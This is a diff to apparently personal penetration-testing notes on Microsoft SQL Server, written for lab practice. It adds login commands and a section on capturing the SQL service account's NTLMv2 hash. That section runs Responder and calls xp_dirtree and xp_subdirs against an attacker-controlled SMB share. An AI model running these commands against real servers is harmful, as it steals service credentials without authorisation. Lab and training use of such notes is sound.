@@ -25,31 +25,57 @@ python3 mssqlclient.py <username>@<TARGET IP> -windows-auth
 **OR**
 
 - If we use `sqlcmd` command then we need to use `GO` after every query.
+- `sqsh` is an alternative to `sqlcmd`.
 
 ```bash
-sqlcmd -S <SERVER_NAME> -U <USERNAME> -P '<PASSWORD>' 
+sqsh -S <SERVER_NAME> -U <USERNAME> -P '<PASSWORD>' 
+```
+
+**OR**
+
+- By Default in port `1433` but based on the port where MSSQL runs use that in place of `1433`.
+- If it doesn't work, append `-windows-auth` at the last , when the account you are logging with is a service account.
+
+```bash
+impacket-mssqlclient -p 1433 <USERNAME>@<SERVER_IP>
+```
+
+
+## Capture MSSQL Service Hash
+
+### ATTACK LOGIC
+
+1. **The Trick:** You tell the SQL server, _"Hey, go look at the files inside `\\YOUR-ATTACKER-IP\share`."_
+2. **The Knock:** The SQL server connects to your attacking machine (where you have a tool like `Responder` or `smbserver.py` running).
+3. **The Handshake:** Your attacking machine says, _"Sure, you can look at my files, but you need to tell me who you are first."_
+4. **The Theft:** The SQL server automatically replies by handing over its **NTLMv2 username and password hash** to prove its identity.
+
+
+#### XP_SUBDIRS Hash Stealing with Responder
+
+- Need to start the `responder` first because we need to actively listen or accept connections so that we can capture the hash of the service account.
+
+```mysql
+sudo responder -I <network_interface> # for example eth0 wlan0 tun0(for htb)
+```
+
+#### XP_DIRTREE Hash Stealing
+
+```mysql
+1> EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\'
+2> GO
+```
+
+**OR**
+#### XP_SUBDIRS Hash Stealing
+
+```mysql
+1> EXEC master..xp_subdirs '\\<ATTACKER_IP>\share\'
+2> GO
 ```
 
 
 
-### Setup for mssqlclient.py
-
-- To run the program we need to install the `impacket` library in python.
-- Its always safer to do all of this is a safe virtual environment.
-
-```bash
-git clone https://github.com/fortra/impacket.git
-cd impacket
-python -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
-pip install .
-```
-
-### mssqlclient.py Location
-
-- After the setup procedure the `mssqlclient.py` will be inside `impacket/examples/mssqlclient.py`.
-- So move or copy that file into your current working directory and then run the command to connect to the MSSQL server.
 
 ## Impersonate Existing Users with MSSQL
 
